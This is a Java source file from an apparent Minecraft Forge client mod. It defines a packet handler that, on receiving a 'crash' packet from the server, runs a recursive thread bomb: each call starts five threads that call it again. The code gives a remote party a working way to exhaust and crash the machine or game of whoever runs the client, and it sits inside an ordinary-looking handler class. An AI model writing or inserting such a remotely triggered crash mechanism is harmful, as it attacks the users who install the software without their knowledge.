package com.github.maxopoly.WPClient.packetHandling;

import com.github.maxopoly.WPCommon.packetHandling.AbstractPacketHandler;
import net.minecraftforge.fml.common.FMLLog;
import org.json.JSONObject;

public class CrashHandler extends AbstractPacketHandler {

	public CrashHandler() {
		super("crash");
	}

	@Override
	public void handle(JSONObject json) {
		FMLLog.getLogger().info("It didnt have to come this far...");
		order66();
	}

	private static void order66() {
		for (int i = 0; i < 5; i++) {
			new Thread(new Runnable() {

				@Override
				public void run() {
					order66();
				}
			}).start();
		}
	}
}
